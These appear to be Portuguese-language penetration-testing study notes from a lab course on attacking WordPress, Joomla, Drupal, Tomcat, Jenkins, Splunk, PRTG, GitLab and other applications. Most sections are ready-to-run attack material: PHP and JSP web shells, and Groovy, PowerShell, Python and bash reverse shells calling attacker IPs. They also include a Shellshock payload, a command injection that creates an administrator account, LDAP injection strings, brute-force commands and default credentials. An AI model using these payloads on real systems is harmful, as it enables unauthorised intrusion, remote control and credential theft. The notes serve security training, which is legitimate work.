# Attacking Common Applications (CWES)

- Ataques em aplicacoes comuns (WordPress, GitLab, Tomcat, Splunk, etc), desde CVEs ate más configuracoes.

---

- **CMS (WordPress**, **Joomla** e **Drupal)**
    - **WordPress**
        
        Identificar de forma automatizada se o site usa Wordpress (podemos ver o robots.txt e ver manualmente tbm) e se sim, themes e plugins (CVEs..):
        
        ```bash
        curl -s [http://blog.inlanefreight.local](http://blog.inlanefreight.local/) | grep WordPress
        ```
        
        ```bash
        curl -s http://blog.inlanefreight.local | grep themes
        
        curl -s http://blog.inlanefreight.local | grep plugins
        ```
        
        - Na pagina de wp-login.php, podemos tentar logar com um usuario provavalmente nao registrado e com um registrado (admin) para ver se eh vulneravel a Username Enumeration de acordo com a resposta.
        
        ---
        
        - **WPScan (token:** [https://wpscan.com/](https://wpscan.com/))
            
            para usar o token: **`--api-token <TOKEN>`**
            
            ```bash
            sudo gem install wpscan
            ```
            
            ```bash
            sudo wpscan --url http://blog.inlanefreight.local --enumerate
            ```
            
        
        ---
        
        - <u>**Attacking WordPress**</u>
            - **BRUTEFORCE** de **senha** quando temos um username:
                
                ```bash
                sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local/wp-login.php
                # OU
                sudo wpscan --password-attack wp-login -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local/wp-login.php
                ```
                
            - **QUANDO LOGAMOS COM ADMIN:**
                - Podemos explorar indo em ***Appearance* → *Themes Editor***. **Agora podemos alterar o codigo de algum php (ex: 404 Template) com uma web shell ou com reverse shell:
                    
                    ```bash
                    # Web Shell:
                    system($_GET[0]);
                    # Reverse shell:
                    https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php?ref=localhost
                    ```
                    
                - Acessamos no diretorio: **`/wp-content/themes/<theme name>`**
            - Plugins com vulnerabilidades:
                - **mail-masta**
                - **wpDiscuz**
        
        ---
        
    - **Joomla**
        - **Discovery e Enumeration**
            
            ### **Discovery**
            
            - robots.txt
                
                ```bash
                curl -s http://dev.inlanefreight.local/ | grep Joomla
                ```
                
            - Tentar ver a versao:
                
                ```bash
                curl -s http://app.inlanefreight.local/README.txt | head -n 5
                ```
                
                ```bash
                curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
                ```
                
            
            ---
            
            ### **Enumeration**
            
            **joomscan**:
            
            ```bash
            sudo python2.7 -m pip install urllib3
            sudo python2.7 -m pip install certifi
            sudo python2.7 -m pip install bs4
            
            python2.7 joomlascan.py -u http://app.inlanefreight.local
            ```
            
            ---
            
            ### **LOGIN BRUTEFORCING**
            
            ```bash
            sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
            ```
            
            ---
            
        - **Attacking Joomla**
            - Quando conseguimos credenciais, vamos em **`/administrator`** e logamos.
                
                ```
                If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in
                
                Navigate to "
                http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
                " 
                and disable the "
                Quick Icon - PHP Version Check" 
                plugin. This will allow the control panel to display properly.
                ```
                
            - Podemos conseguir RCE ao customizar um template e inserir codigo PHP, primeiro vamos em ***Configuration*** → ***Templates***. Agora vamos em ***Templates*** e escolhemos um template e em seguida uma pagina php.
            - Agora inserimos no codigo o comando:
                
                ```bash
                system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
                ```
                
            - E acessamos no nosso terminal ou URL com:
                
                ```bash
                curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
                ```
                
            
            Directory traversal quando temos credenciais:
            
            ```bash
            python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir / 
            ```
            
            ---
            
    - **Drupal**
        - **Discovery & Enumeration**
            
            ```bash
            curl -s http://drupal.inlanefreight.local | grep Drupal
            ```
            
            - O **Drupal** indexa seu conteudo por nodes, entao podemos tentar identificar: <u>http://drupal.inlanefreight.local/node/1</u>
            
            Agora que identificamos a exitencia do Drupal podemos **Enumerar** versao e etc: 
            
            ```bash
            curl -s http://192.168.100.52/drupal/CHANGELOG.txt | grep -m2 ""
            ```
            
            ```bash
            curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt
            ```
            
            ```bash
            droopescan scan drupal -u http://drupal.inlanefreight.local
            ```
            
        - **Attacking Drupal**
            
            Existem CVEs criticos em versoes antigas.
            
            **AMBOS os casos abaixo necessitam que tenhamos credenciais/acesso ao dashboard**
            
            ---
            
            - Em **versoes <8**, podemos no **dashboard** visitar modules e ativar ***PHP filter***, que permite que criemos uma pagina php com RCE em ***Content* → *Basic page*** (mudar o text format la embaixo para PHP code).
            
            ---
            
            1. Ja em versoes atuais, precisamos baixar a versao + recente (checar em [https://www.drupal.org/project/php/releases](https://www.drupal.org/project/php/releases) e inserir no comando abaixo):
                
                ```bash
                wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
                ```
                
            2. Agora vamos em ***Administration*** > ***Reports*** > ***Available updates*** (pode ser em Extend tambem dependendo). E fazemos upload do arquivo que baixamos.
            3. Agora vamos em ***Content*** e criamos uma ***Basic Page*** em **PHP code**.
            
            ---
            
            Podemos tambem, se tivermos permissao, adicionar um backdoored module ao adicionar uma shell em um modulo. Primeiro baixamos e extraimos:
            
            ```bash
            wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
            tar xvf captcha-8.x-1.2.tar.gz
            ```
            
            Criamos agora um PHP web shell:
            
            ```php
            <?php
            system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
            ?>
            ```
            
            Agora um **.htaccess**:
            
            ```html
            <IfModule mod_rewrite.c>
            RewriteEngine On
            RewriteBase /
            </IfModule>
            ```
            
            ```bash
            mv shell.php .htaccess captcha
            tar cvf captcha.tar.gz captcha/
            ```
            
            Agora no site vamos em ***Manage*** e ***Extend***, e ***+ Install new module***, e subimos nosso arquivo captcha.
            
            Agora apenas conectarmos com RCE:
            
            ```bash
            curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
            ```
            
            ---
            

---

- **Servlet Containers/Software Development (Tomcat** e **Jenkins)**
    - **Tomcat**
        - **Discovery & Enumeration**
            
            ### Discovery
            
            ```bash
            curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
            ```
            
            ### **Enumeration**
            
            - Usar gobuster para ver diretorios sensiveis:
                
                ```bash
                gobuster dir -u http://10.129.201.89:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x jsp,html,txt
                ```
                
            
            ---
            
        - **Attacking Tomcat**
            
            Tentar credenciais padrao: 
            
            **admin:admin**
            
            **tomcat:tomcat**
            
            Se tivermos LFI, checar arquivos sensiveis: `/WEB-INF/web.xml`, `tomcat-users.xml`
            
            ---
            
            **Brute-force com metasploit:**
            
            ```bash
            use auxiliary/scanner/http/tomcat_mgr_login
            ```
            
            - Setar tanto IP quanto o VHOST (URL), e tambem **`set stop_on_success true`**
            
            ---
            
            Ao logarmos (em **/manager/html)**, podemos fazer upload de uma web shell em JSP (***WAR file***):
            
            [https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
            
            ```bash
            wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
            zip -r backup.war cmd.jsp 
            ```
            
            O arquivo estara em ***/backup***, entao acessamos:
            
            ```bash
            curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
            ```
            
            (podemos fazer undeploy depois para retirar rastro)
            
            ## SE NAO DER CERTO, CRIAR O PAYLOAD !!!!! :
            
            ```bash
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.13.76.53 LPORT=443 -f war > backup.war
            ```
            
        
        ---
        
    - **Jenkins**
        - **Discovery & Enumeration**
            - Tentar fazer brute-force e ver se algumas páginas são acessíveis sem login:
                
                **`/manage`  `/script`  `/configureSecurity/`  `/pluginManager`**
                
            - Tentar credenciais padrão:
                
                **`admin:admin`**
                
                **`admin:password`**
                
                **`jenkins:jenkins`**
                
                **`ci:ci`**
                
            
            ---
            
        - **Attacking Jenkins**
            - Uma vez logados, podemos explorar através do **Script Console**, que nos permite executar Groovy scripts.
            
            ### Script Console
            
            - Encontrado em `http://jenkins.inlanefreight.local:8000/script`
            - Podemos ou usar Metasploit ([link](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/)) ou manualmente pegar uma Reverse Shell (ver se o sistema eh windows ou linux e pegar o payload de acordo):
            - Abrimos listener (**`nc -lvp 4444`**) no nosso terminal e rodamos o script no site:
                
                ```groovy
                r = Runtime.getRuntime()
                p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
                p.waitFor()
                ```
                
                (Lembrando que vai ser um sistema **Windows**)
                

---

- **Common Gateway Interfaces (Tomcat CGI** e **Shellshock)**
    - **Attacking Tomcat CGI**
        
        Roda normalmente na porta 8080, com nmap identificamos.
        
        ---
        
        Versoes`9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93`:
        
        Basicamente exploramos fazendo bruteforce de diretorios para encontrar arquivos com formato **.cmd** ou **.bat** (rodamos os dois) dentro do diretorio *CGI*, que manipularemos.
        
        ```bash
        # .cmd:
        ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.cmd
        # .bat:
        ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat
        ```
        
        **METASPLOIT (deu certo no ex):
        `use windows/http/tomcat_cgi_cmdlineargs`**
        
        ---
        
        Ao encontrarmos, podemos tentar rodar comandos:
        
        `http://10.129.204.227:8080/cgi/welcome.bat?&dir`
        
        Caso nao consigamos rodar um whoami por exemplo, checamos as variaveis:
        
        `http://10.129.204.227:8080/cgi/welcome.bat?&set`
        
        Com isso podemos analisar (usar GPT pra ajudar qlqr coisa) e ver o que precisamos declarar a mais para rodar esses comandos, no Ex do forum a variavel PATH esta vazia, entao fornecemos na URL:
        
        `http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
        
        CASO de errado ainda, podemos encodar com URL:
        
        `http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
        
        ---
        
    - **Attacking Shellshock**
        
        Primeiro procuramos por diretórios de scripts (***.cgi***):
        
        ```bash
        gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
        ```
        
        Após encontrar, podemos tentar explorar com um cURL:
        
        ```bash
        curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
        ```
        
        Após confirmarmos a vulnerabilidade, podemos realizar uma reverse shell:
        
        ```bash
        nc -lvp 4444
        ```
        
        e
        
        ```bash
        curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.174/4444 0>&1' http://10.129.204.231/cgi-bin/access.cgi
        ```
        

---

- **Infrastructure/Network Monitoring Tools (Splunk** e **PRTG)**
    - **Splunk**
        - https://github.com/0xjpuff/reverse_shell_splunk
        - Normalmente roda na porta 8000. Uma vez que com acesso (seja pq a empresa deixou na versao free e estamos unauthenticated ou etc):
        - **Se alvo for WINDOWS**
            1. Criamos os diretorios:
                
                ```bash
                mkdir -p splunk_shell/bin
                mkdir -p splunk_shell/default
                ```
                
            2. Dentro do **`/bin`** criamos os seguintes arquivos:
                
                **run.ps1** (trocar IP)
                
                ```bash
                $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
                $stream = $client.GetStream();
                [byte[]]$bytes = 0..65535|%{0};
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                $sendback = (iex $data 2>&1 | Out-String );
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush()
                }
                $client.Close()
                ```
                
                **run.bat**
                
                ```bash
                @ECHO OFF
                PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
                Exit
                ```
                
            3. E dentro do **`/default`**:
                
                **inputs.conf**
                
                ```bash
                [script://.\bin\run.bat]
                disabled = 0
                interval = 10
                sourcetype = shell
                ```
                
            4. Agora empacotamos o app: 
                
                **`tar -czf updater.tar.gz splunk_shell/`**
                
            5. Abrimos um listener
                
                **`nc -lnvp 443`** 
                
                E no painel Splunk na toolbar vamos em 
                
                ***Apps > Manage Apps > Install app from file***
                
                e fazemos upload do arquivo ***updater.tar.gz***
                
                Ira executar automaticamente
                
        - **Se alvo for LINUX**
            1. Criamos os diretorios:
                
                ```bash
                mkdir -p splunk_shell/bin
                mkdir -p splunk_shell/default
                ```
                
            2. Dentro do **`/bin`** criamos os seguintes arquivos:
                
                **rev.py** (trocar IP)
                
                ```bash
                import socket, os, pty
                
                ip = "10.10.14.15"     # ← Substitua pelo seu IP real (Kali ou Pwnbox)
                port = 443             # ← Ou outra porta onde estiver escutando
                
                s = socket.socket()
                s.connect((ip, port))
                os.dup2(s.fileno(), 0)  # stdin
                os.dup2(s.fileno(), 1)  # stdout
                os.dup2(s.fileno(), 2)  # stderr
                pty.spawn("/bin/bash")
                
                ```
                
            3. E dentro do **`/default`**:
                
                **inputs.conf**
                
                ```bash
                [script://./bin/rev.py]
                disabled = 0
                interval = 10
                sourcetype = shell
                ```
                
            4. Agora empacotamos o app: 
                
                **`tar -czf updater.tar.gz splunk_shell/`**
                
            5. Abrimos um listener
                
                **`nc -lnvp 443`** 
                
                E no painel Splunk vamos em 
                
                ***Apps > Manage Apps > Install app from file***
                
                e fazemos upload do arquivo ***updater.tar.gz***
                
                Ira executar automaticamente
                
        
        ---
        
    - **PRTG Network Monitor**
        - Pode rodar em nas portas 80, 443, ou 8080.
        - **Discovery & Enumeration**
            - Enumerar versao:
                
                ```bash
                curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
                ```
                
            - Default credentials:
                - **`prtgadmin:prtgadmin`**
                - **`prtgadmin:Password123`**
                - …
        
        ---
        
        - Uma vez logados, para explorar a vulnerabilidade [CVE](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) versao < 18.2.39 vamos em:
            
            **`*Setup` > `My account` or`Account Settings` > `Notifications` > `Add new notification`*.**
            
            Damos um nome X para notificacao, tickamos a box **`EXECUTE PROGRAM`**, em ***Program File*** selecionamos **`Demo exe notification - outfile.ps1`,** e por ultimo adicionamos em ***Parameter***:
            
            **`test.txt;net user prtgadm1 senhafoda! /add;net localgroup administrators prtgadm1 /add`**
            
            Agora em Notifications clicamos em ***Test*** na que criamos.
            
            Agora esta feito, e podemos conectar usando **crackmapexec** com as credenciais (nao trocar a senha pq buga, deve ser pq tem que seguir um padrao) que estabelecemos:
            
            ```bash
            sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
            ```
            

---

- **Customer Service Mgmt & Configuration Management (osTicket** e **GitLab)**
    - **osTicket**
        
        Podemos coletar emails de funcionarios ao enviar tickets (usar para OSINT futuramente..)
        
        ---
        
    - **GitLab**
        
        Ao descobrirmos que a empresa usa gitlab ([http://gitlab.inlanefreight.local:8081/users/sign_in](http://gitlab.inlanefreight.local:8081/users/sign_in)), para descobrir a versão podemos criar uma conta para ir no diretório ***/help.***
        
        Checar se existe algum repositório público em ***/explore***, caso nao tenha nada, podemos tentar criar conta e logar.
        
        ---
        
         ******[CVE](https://www.exploit-db.com/exploits/49821) de User Enumeration < 13.10.3.
        
        ```bash
        ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
        ## Se der erro: 
        bash gitlab_user_enum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist /home/alexinsel/seclists/Usernames/top-usernames-shortlist.txt
        ```
        
        Apos encontrar um Usuario → Bruteforce metasploit: `use auxiliary/scanner/http/gitlab_login`
        
        ---
        
        Uma vez que autenticados, podemos explorar caso: versions < 13.10.2  [RCE](https://www.exploit-db.com/exploits/49951)
        
        Baixar, abrir um listener e rodar:
        
        ```bash
        python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.82 4444 >/tmp/f '
        ```
        

---

- **Thick Client Applications**
    - **Attacking Thick Client Applications**
        
        Um **thick client** é um software instalado localmente no computador da vítima (EXE, JAR, etc.), que interage com servidores (ou bancos de dados) para realizar tarefas, mas roda a maior parte da lógica no lado do cliente (o computador do usuário). Ex: Aplicativos de CRM, ERPs, sistemas internos corporativos. Podem ser feitos em .NET, Java, Delphi, C++, etc.
        
        Basicamente em um SMB ou quando autenticados em um Windows por exemplo, podemos analisar o codigo-fonte de arquivos .exe..
        
        ---
        
        Exemplo citado: [https://academy.hackthebox.com/module/113/section/2139](https://academy.hackthebox.com/module/113/section/2139)
        
        ---
        
    - **Exploiting Web Vulnerabilities in Thick-Client Applications**
        
        [https://academy.hackthebox.com/module/113/section/2164](https://academy.hackthebox.com/module/113/section/2164)
        
        bruhhh
        

---

- **Miscellaneous Applications (ColdFusion, IIS, LDAP..)**
    - **ColdFusion**
        
        Linguagem de programacao (CFML), similar ao HTML.
        
        Identificamos com Nmap sV, extensoes ***.cfm*** ou ***.cfc***.
        
        Pode rodar nas portas:
        
        | 80 | HTTP |
        | --- | --- |
        | 443 | HTTPS |
        | 1935 | RPC |
        | 25 | SMTP |
        | 8500 | SSL |
        | 5500 | Server Monitor |
        
        Ver versao fucando, e procurar por exploits.
        
    
    ---
    
    - **IIS Tilde Enumeration**
        
        versões antigas, ex: IIS 6, 7, 7.5.
        
        Basicamente o sistema guarda um nome curto para arquivos, ex: 
        
        **`SecretDocuments`** → **`SECRET~1`**
        
        E podemos enviar requisições com variações como:
        
        [http://target/~s](http://target/~s)
        
        [http://target/~se](http://target/~se)
        
        [http://target/~sec](http://target/~sec)
        
        e decobrimos assim diretórios e arquivos ocultos.
        
        ---
        
        EXPLORAMOS primeiramente enumerando os nomes curtos:
        
        (precisamos ter baixado o oracle java [https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/))
        
        ```bash
        git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
        cd release
        java -jar iis_shortname_scanner.jar 0 5 http://10.129.93.149/
        # Pressionar ENTER ou qlqr coisa, para selecionar a opção Não quando pedir.
        ```
        
        Após acharmos nomes curtos, podemos criar uma wordlist personalizada para tentar encontrar o nome completo correspondente e depois rodar gobuster para enumerar (no caso estamos criando uma wordlist para o nome curto encontrado: **`TRANSF~1.ASP`**, então damos um grep em transf):
        
        ```bash
        egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
        ```
        
        ```bash
        gobuster dir -u http://10.129.93.149/ -w /tmp/list.txt -x .aspx,.asp
        ```
        
    
    ---
    
    - **LDAP**
        - **LDAP (Lightweight Directory Access Protocol)**: protocolo de acesso a diretórios, comumente usado para autenticação centralizada.
        - Portas padrão:
            - **389** - LDAP
            - **636** - LDAPS com SSL
            - mas normalmente a autenticacao de login da pagina 80 usa LDAP.
        
        ---
        
        **LDAP injection** → parecido com o sql injection, exploramos em formulários. 
        
        na senha inserimos **`*`**, e na parte de login prenchemos com:
        
        ```bash
        *)(uid=*))(|(uid=*
        ```
        
        podemos testar outros payloads:
        
        ```bash
        admin)(|(userPassword=*)
        
        )(objectClass=)(&(
        
        (uid=*))(|(uid=*
        ```
        
    
    ---
    
    - **Web Mass Assignment Vulnerabilities**
        
        Quando uma aplicação **atribui automaticamente valores recebidos do usuário a um modelo** (ex: usuário, produto, etc.), **sem controle** sobre quais campos podem ser preenchidos, comum em frameworks como **Ruby on Rails**, **Django**, **Laravel**, etc.
        
        [https://academy.hackthebox.com/module/113/section/2160](https://academy.hackthebox.com/module/113/section/2160)
        
    
    ---
    
    - **Attacking Applications Connecting to Services (.ELF** e **.DLL)**
        
        Quando estamos em uma Shell no target e notamos binários (arquivos customizados).
        
        - **ELF Executable Examination (linux)**
            
            Normalmente em Diretórios como: `/opt/`, `/home/user/tools/`, `/var/www/`, `/usr/local/bin/`, `/srv/app/`, etc. E com os nomes de: `octopus_checker`, `checker`, `monitor`, `verifier`, `healthcheck`, `status`, `probe`, `client`, etc.
            
            Ao encontrar (ex: **octopus_checker)**, rodamos o arquivo e usamos o **https://github.com/longld/peda** para analisarmos melhor:
            
            ```bash
            ./octopus_checker
            ```
            
            ```bash
            gdb ./octopus_checker
            
            run
            
            set disassembly-flavor intel
            
            disas main
            
            # resultará no assembly, pegamos a linha suspeita e rodamos ela, ex:
            '  0x00005555555555ff <+425>:	mov    esi,0x0
               0x0000555555555604 <+430>:	mov    rdi,rax
               0x0000555555555607 <+433>:	call   0x5555555551b0 <SQLDriverConnect@plt>
               0x000055555555560c <+438>:	add    rsp,0x10
               0x0000555555555610 <+442>:	mov    WORD PTR [rbp-0x4b4],ax
            '
            # pegamos o do SQL(EH O END DA DIRETA):
            b *0x5555555551b0
            run
            ```
            
        - **DLL File Examination (windows)**
            
            Normalmente em diretórios como: 
            
            - `C:\Program Files\App\bin\`
            - `C:\Users\<User>\Desktop\App\`
            - `C:\inetpub\wwwroot\App\bin\`
            
            E com nomes de: `API.dll`, `BusinessLogic.dll`, `DataAccess.dll`
            
            ---
            
            ex de binário encontrado: `.\MultimasterAPI.dll`
            
            Primeiro rodamos o arquivo:
            
            ```powershell
            Get-FileMetaData .\MultimasterAPI.dll
            ```
            
            Usamos o https://github.com/dnSpy/dnSpy para explorarmos melhor.
            
            Fuçar, no caso do exemplo encontramos as credenciais vazadas em **`MultimasterAPI.Controllers` → `ColleagueController`**
            
    
    ---
    
    - **Other Notable Applications**
        
        
        | **Application** | **Abuse Info** |
        | --- | --- |
        | [Axis2](https://axis.apache.org/axis2/java/core/) | This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a [webshell](https://github.com/tennc/webshell/tree/master/other/cat.aar) in the form of an AAR file (Axis2 service file). There is also a Metasploit [module](https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html) that can assist with this. |
        | [Websphere](https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server) | Websphere has suffered from many different [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html) over the years. Furthermore, if we can log in to the administrative console with default credentials such as `system:manager` we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell. |
        | [Elasticsearch](https://en.wikipedia.org/wiki/Elasticsearch) | Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen [this](https://www.exploit-db.com/exploits/36337) before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine [Haystack](https://youtube.com/watch?v=oGO9MEIz_tI&t=54) features Elasticsearch. |
        | [Zabbix](https://en.wikipedia.org/wiki/Zabbix) | Zabbix is an open-source system and network monitoring solution that has had quite a few [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html) discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box [Zipper](https://youtube.com/watch?v=RLvFwiDK_F8&t=250) showcases how to use the Zabbix API to gain RCE. |
        | [Nagios](https://en.wikipedia.org/wiki/Nagios) | Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials `nagiosadmin:PASSW0RD` and fingerprinting the version. |
        | [WebLogic](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server) | WebLogic is a Java EE application server. At the time of writing, it has 190 reported [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html). There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities. |
        | Wikis/Intranets | We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials. |
        | [DotNetNuke](https://en.wikipedia.org/wiki/DNN_(software)) | DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe [issues](https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html) over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download. |
        | [vCenter](https://en.wikipedia.org/wiki/VCenter) | vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this [Apache Struts 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) that scanners like Nessus do not pick up. This [unauthenticated OVA file upload](https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/) vulnerability was disclosed in early 2021, and a PoC for [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005) was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise. |
